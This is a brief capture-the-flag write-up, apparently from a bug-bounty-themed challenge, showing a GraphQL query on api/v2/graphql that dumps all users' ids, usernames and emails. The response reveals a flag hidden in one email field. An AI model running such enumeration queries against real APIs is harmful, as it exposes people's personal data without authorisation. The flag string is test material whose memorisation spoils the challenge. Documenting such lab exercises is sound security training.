- graphql leak all user information
- endpoint: `api/v2/graphql`

#### GraphQL request
```
{"query":"query {\r\n  users {\r\n    id\r\n    username\r\n    email\r\n  }\r\n}\r\n\n        "}
```

#### GraphQL response

```
{"data":{"users":[{"id":"359fb73c-cbe8-4b1b-b7d9-fa26c4ed1f0b","username":"nahamsec","email":"nahamsec@bugbounty.ctf"},{"id":"5b2d7302-a424-4c41-9412-b378acedda08","username":"rhynorater","email":"rhynorater@bugbounty.ctf"},{"id":"15ee453d-18c7-419b-a3a6-ef8f2cc1271f","username":"stok","email":"flag_4{253a82878df615bb9ee32e573dc69634}"},{"id":"4d513e52-a79a-417a-8199-cc091220f340","username":"shubs","email":"shubs@bugbounty.ctf"},{"id":"bbccd010-bbd0-4b48-9c34-f4e151c4d9e4","username":"fattselimi","email":"fattselimi@bugbounty.ctf"},{"id":"30ec2071-eb96-4785-9a9a-c79b438f6181","username":"insiderphd","email":"insiderphd@bugbounty.ctf"},{"id":"cbba1083-0b54-4b66-aafd-350eea037d38","username":"inti","email":"inti@bugbounty.ctf"},{"id":"874d18fc-3479-4cae-a915-01b0bb7a6c49","username":"renniepak","email":"renniepak@bugbounty.ctf"},{"id":"fd55a401-b110-4821-9155-add4653cb992","username":"hacker","email":"hacker@bugbounty.ctf"}]}}
```



Solved by: ks2119